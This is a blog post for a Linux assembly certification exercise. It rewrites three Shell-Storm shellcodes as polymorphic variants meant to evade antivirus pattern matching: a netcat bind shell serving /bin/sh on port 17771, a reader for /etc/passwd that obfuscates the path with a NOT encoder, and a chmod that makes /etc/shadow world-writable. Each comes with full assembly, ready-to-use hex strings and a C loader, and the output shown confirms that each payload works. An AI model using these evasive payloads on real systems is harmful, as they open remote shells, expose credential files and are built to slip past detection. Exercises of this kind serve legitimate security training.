# Assignment #6: Polymorphic Shellcode

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger 150% of the existing shellcode
- Bonus points for making it shorter in length than original


### Solution

I chose the shellcodes:
1. Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode - Shellcode that listen on port 17771 and give a shell (/bin/sh)
2. Linux x86 file reader - Shellcode that open a file and read it
3. Linux/x86 chmod("/etc/shadow", 0666) shellcode



#### linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode
I downloaded, analyzed and create my polymorphic shellcode from http://shell-storm.org/shellcode/files/shellcode-872.php

##### Shellcode Analysis
It is a very easy shellcode where it is just using the execve syscall with the parameter "/bin/nc -le /bin/sh -vp 17771". So, We can see how is pushing the strings on the stack and saving the stack pointer on the registers.

```asm
    xor eax, eax
    xor edx, edx
    push eax
    push 0x31373737     ;-vp17771
    push 0x3170762d
    mov esi, esp
```
```asm

    push eax
    push 0x68732f2f     ;-le//bin//sh
    push 0x6e69622f
    push 0x2f656c2d
    mov edi, esp
```

```asm
    push eax
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp
```

Just execute the execve syscall:

```asm
    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
```


##### Polymorphic Shellcode

Creating a polymorphic shellcode, I have used different methods. To the "-vp17771" I have used the mov instruction on the stack:

```
    mov dword [esp - 4], 0x31373737
    mov dword [esp - 8], 0x3170762d 
    sub esp, 8
    mov esi, esp
```

To do the "-le//bin//sh" I have used the push instruction but with a polymorphic calculation of the data, doing add and sub instructions:

```
    push eax 
    mov eax, 0x68732f2f
    push eax
    add eax, 0x5f63301
    sub eax, 1
    push eax
    sub eax, 0x3f03f602
    push eax
```

To do the "/bin/nc" I continued doing the add instruction to create the correct string (/bin/sh):

```
    push edx
    add eax, 0x3408c302
    push eax
    add eax, 0xafb3301
    sub eax, 1
    push eax
    mov ebx, esp
    mov eax, edx

```

So, the final shellcode is:

```
global _start
section .text
 _start:
    xor eax, eax
    mov edx, eax
    push eax
    ; push 0x31373737     ;-vp17771
    ; push 0x3170762d
    mov dword [esp - 4], 0x31373737
    mov dword [esp - 8], 0x3170762d 
    sub esp, 8
    mov esi, esp

    push eax 
    mov eax, 0x68732f2f
    push eax
    add eax, 0x5f63301
    sub eax, 1
    push eax
    sub eax, 0x3f03f602
    push eax
    ; mov dword [esp - 4], 0x68732f2f
    ; mov dword [esp - 8], 0x6e69622f
    ; mov dword [esp - 12], 0x2f656c2d
    ; sub esp, 12
    ; push 0x68732f2f     ;-le//bin//sh
    ; push 0x6e69622f
    ; push 0x2f656c2d
    mov edi, esp

    push edx
    ; push eax
    ; push 0x636e2f2f     ;/bin//nc
    ; push 0x6e69622f
    add eax, 0x3408c302
    push eax
    add eax, 0xafb3301
    sub eax, 1
    push eax
    mov ebx, esp
    mov eax, edx

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
```

Compile, test and calcule the %:

```
$ nasm -f elf32 netcat.nasm -o netcat.o
$ ld netcat.o -o netcat
$ objdump -d ./netcat|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x89\xc2\x50\xc7\x44\x24\xfc\x37\x37\x37\x31\xc7\x44\x24\xf8\x2d\x76\x70\x31\x83\xec\x08\x89\xe6\x50\xb8\x2f\x2f\x73\x68\x50\x05\x01\x33\xf6\x05\x83\xe8\x01\x50\x2d\x02\xf6\x03\x3f\x50\x89\xe7\x52\x05\x02\xc3\x08\x34\x50\x05\x01\x33\xfb\x0a\x83\xe8\x01\x50\x89\xe3\x89\xd0\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```
$ cat netcat-new.c 
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xc0\x89\xc2\x50\xc7\x44\x24\xfc\x37\x37\x37\x31\xc7\x44\x24\xf8\x2d\x76\x70\x31\x83\xec\x08\x89\xe6\x50\xb8\x2f\x2f\x73\x68\x50\x05\x01\x33\xf6\x05\x83\xe8\x01\x50\x2d\x02\xf6\x03\x3f\x50\x89\xe7\x52\x05\x02\xc3\x08\x34\x50\x05\x01\x33\xfb\x0a\x83\xe8\x01\x50\x89\xe3\x89\xd0\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}

$ gcc -fno-stack-protector -z execstack netcat-new.c -o netcat-new
$ ./netcat-new 
Shellcode Length: 80
listening on [any] 17771 ...
```

Finally, we have a shellcode with length 80 and the original shellcode has length 58, so we have increased the shellcode 37.93%.



#### Linux x86 file reader

I got the shellcode from http://shell-storm.org/shellcode/files/shellcode-73.php


##### Shellcode Analysis #####
This shellcode uses the jump call pop technique to get the string with the file path, and it is using four syscalls, sys\_open, sys\_read, sys\_write and sys\_exit.

First, get the filename:

```asm
	jmp	two
one:
	pop	ebx
...
two:
	call	one
	.string db "/etc/passwd"
```

Second, open the file and save the file descriptor:

```asm
	pop	ebx
	mov	al, 5
	xor	ecx, ecx
	int	0x80
	mov	esi, eax
```

Third, read and write character by character until EOF:

```asm
read:
	mov	ebx, esi
	mov	al, 3
	sub	esp, 1
	lea	ecx, [esp]
	mov	dl, 1
	int	0x80

	xor	ebx, ebx
	cmp	ebx, eax
	je	exit

	mov	al, 4
	mov	bl, 1
	mov	dl, 1
	int	0x80
	
	add	esp, 1
	jmp	read

```

When EOF is reached, Exit syscall is executed

```asm
exit:
	mov	al, 1
	xor	ebx, ebx
	int	0x80
```


##### Polymorphic Shellcode 

As our goal is to do the shellcode polymorphic and more undetectable to the AVs. We started encoding the filename string with a simple *not encoder*.


Encode string with NOTs: 
```bash
$ echo -e 'import ctypes\nimport sys\nf="/etc/passwd"\nfor i in f:\n\tsys.stdout.write(hex(ctypes.c_uint8(~ord(i)).value)+",")\nsys.stdout.write("\\nLength: %s\\n"%len(f))' | python
0xd0,0x9a,0x8b,0x9c,0xd0,0x8f,0x9e,0x8c,0x8c,0x88,0x9b,
Length: 11
```

We still using the jump call pop technique, but we have to decode the filename.

```asm
	jmp	two
one:
	pop	ebx
	
	; Decode string
	mov 	cl, 11		; File path length
decode:
	not byte [ebx]
	inc ebx
	loop decode
	sub 	ebx, 11		; Restore the address string
...
two:
	call one
	.string db 0xd0,0x9a,0x8b,0x9c,0xd0,0x8f,0x9e,0x8c,0x8c,0x88,0x9b	; Encoded string with not
```

After we open the file, read and write, as it is a polymorphic shellcode I have changed some values that they were static and now it is being generated in runtime.

Final shellcode:

```asm
global _start


_start:
	xor	eax, eax
	mov	ebx, eax
	mov	ecx, eax
	mov	edx, eax
	jmp	two



one:
	pop	ebx
	
	; Decode string
	mov 	cl, 11		; File path length
decode:
	not byte [ebx]
	inc ebx
	loop decode
	sub 	ebx, 11		; Restore the address string


	mov	al, 5
	xor	ecx, ecx
	int	0x80
	
	mov	esi, eax
	jmp	read

exit:
	mov	al, dl 		
	xor	ebx, ebx
	int	0x80

read:
	mov	ebx, esi
	mov	al, 3
	sub	esp, 1
	lea	ecx, [esp]
	mov	dl, 1
	int	0x80

	xor	ebx, ebx
	cmp	ebx, eax
	je	exit

	mov	bl, 1
	mov al, bl
	add al, 3
	mov	dl, bl
	int	0x80
	
	add	esp, 1
	jmp	read

two:
	call one
	.string db 0xd0,0x9a,0x8b,0x9c,0xd0,0x8f,0x9e,0x8c,0x8c,0x88,0x9b	; Encoded string with not 
```

Compile, test and calcule the %:

```sh
$ nasm -f elf32 read.nasm -o read.o
$ ld read.o -o read
$ objdump -d ./read|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xeb\x3e\x5b\xb1\x0b\xf6\x13\x43\xe2\xfb\x83\xeb\x0b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\x88\xd0\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb3\x01\x88\xd8\x04\x03\x88\xda\xcd\x80\x83\xc4\x01\xeb\xdd\xe8\xbd\xff\xff\xff\xd0\x9a\x8b\x9c\xd0\x8f\x9e\x8c\x8c\x88\x9b"
```

```c
$ cat read.c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xeb\x3e\x5b\xb1\x0b\xf6\x13\x43\xe2\xfb\x83\xeb\x0b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\x88\xd0\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb3\x01\x88\xd8\x04\x03\x88\xda\xcd\x80\x83\xc4\x01\xeb\xdd\xe8\xbd\xff\xff\xff\xd0\x9a\x8b\x9c\xd0\x8f\x9e\x8c\x8c\x88\x9b";

main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}

$ gcc -fno-stack-protector -e execstack read-new.c -o read-new
$ ./read-new 
Shellcode Length: 88
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
....
```

The original shellcode has 65 bytes + pathname, and our shellcode has 77 bytes + pathname, so we have increased the shellcode 18.46%


#### Linux/x86 chmod("/etc/shadow", 0666) shellcode

The following shellcode change the permissions of the /etc/shadow file using the syscall sys\_chmod.


##### Shellcode Analysis 

The sys\_chmod syscall is 0xf, so, save in the eax register 0xf

```
 	push byte 15
	pop eax
```
eax = 0xf


```
int chmod(const char *pathname, mode_t mode);
```
now, we need the pathname in ebx and the mode (666) in ecx.

/etc/shadow in ebx:

```
	push byte 0x77
	push word 0x6f64
	push 0x6168732f
	push 0x6374652f
	mov ebx, esp
```

666 in ecx:

```
	push word 0666Q
	pop ecx
```

After, just exec the syscall (In addition, the exit syscall is executed at the end):

```
	int 0x80
	push byte 1
	pop eax
	int 0x80

```

##### Polymorphic Shellcode 

My polymorphic shellcode works same but it is generating the pathname on the way.

Saving the sys\_chmod in eax:

```
	xor edx, edx
	xor eax, eax
	add eax, 0xf
```

Generating the pathname:
```
	mov ecx, 0x11
	add ecx, 0x66
	push ecx
	add ecx, 0x6eed
	push cx
	add ecx, 0x616803cb
	push ecx
	push 0x6374652f
	mov ebx, esp
```

Set the mode and run the syscall:

```
	xor ecx, ecx
	mov cx, 0x1b6
	int 0x80
	push byte 1
	pop eax
	int 0x80
```


Compile and run:
```
$ nasm -f elf32 chmod.nasm -o chmod.o
$ ld chmod.o -o chmod
$ objdump -d ./chmod|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xd2\x31\xc0\x83\xc0\x0f\x89\xd1\x52\xb1\x11\x80\xc1\x66\x51\x66\x81\xc1\xed\x6e\x66\x51\x81\xc1\xcb\x03\x68\x61\x51\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x66\xb9\xb6\x01\xcd\x80\x6a\x01\x58\xcd\x80"
$ cat chmod-new.c 
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xd2\x31\xc0\x83\xc0\x0f\x89\xd1\x52\xb1\x11\x80\xc1\x66\x51\x66\x81\xc1\xed\x6e\x66\x51\x81\xc1\xcb\x03\x68\x61\x51\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x66\xb9\xb6\x01\xcd\x80\x6a\x01\x58\xcd\x80";

main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}

# gcc -fno-stack-protector chmod-new.c -o chmod-new
# ls -la /etc/shadow
-rw-r----- 1 root shadow 1333 feb 21  2017 /etc/shadow
# ./chmod-new 
Shellcode Length: 50
# ls -la /etc/shadow
-rw-rw-rw- 1 root shadow 1333 feb 21  2017 /etc/shadow
```

The original shellcode has 39 bytes and our shellcode has 50 bytes, so we have increased the shellcode 38.89%
